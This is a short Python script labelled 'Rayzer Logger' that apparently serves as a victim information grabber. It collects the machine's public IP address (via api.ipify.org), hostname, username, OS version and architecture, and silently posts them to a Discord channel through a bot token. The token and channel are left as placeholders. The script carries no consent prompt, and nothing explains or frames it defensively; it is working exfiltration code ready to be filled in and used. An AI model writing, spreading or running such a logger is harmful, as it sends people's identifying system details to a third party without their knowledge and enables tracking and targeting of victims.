import requests
import socket
import os
import getpass
import platform
from datetime import datetime

BOT_TOKEN = "PUT_BOT_TOKEN_HERE"
CHANNEL_ID = "PUT_CHANNEL_ID_HERE"

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return "Unknown"

def main():
    if BOT_TOKEN == "PUT_BOT_TOKEN_HERE" or CHANNEL_ID == "PUT_CHANNEL_ID_HERE":
        print("Error: Discord Bot credentials not set!")
        return

    ip = get_public_ip()
    hostname = socket.gethostname()
    username = getpass.getuser()
    os_info = platform.system() + " " + platform.release()
    arch = platform.machine()
    
    url = f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages"
    headers = {
        "Authorization": f"Bot {BOT_TOKEN}",
        "Content-Type": "application/json"
    }
    
    embed = {
        "content": None,
        "embeds": [{
            "title": "New Log",
            "color": 0x5865F2,
            "fields": [
                {"name": "Public IP", "value": f"`{ip}`", "inline": True},
                {"name": "Hostname", "value": f"`{hostname}`", "inline": True},
                {"name": "Username", "value": f"`{username}`", "inline": True},
                {"name": "OS info", "value": f"`{os_info}`", "inline": False},
                {"name": "Arch", "value": f"`{arch}`", "inline": True}
            ],
            "footer": {"text": "Rayzer Logger"},
            "timestamp": datetime.utcnow().isoformat() + "Z"
        }]
    }
    
    try:
        requests.post(url, headers=headers, json=embed)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
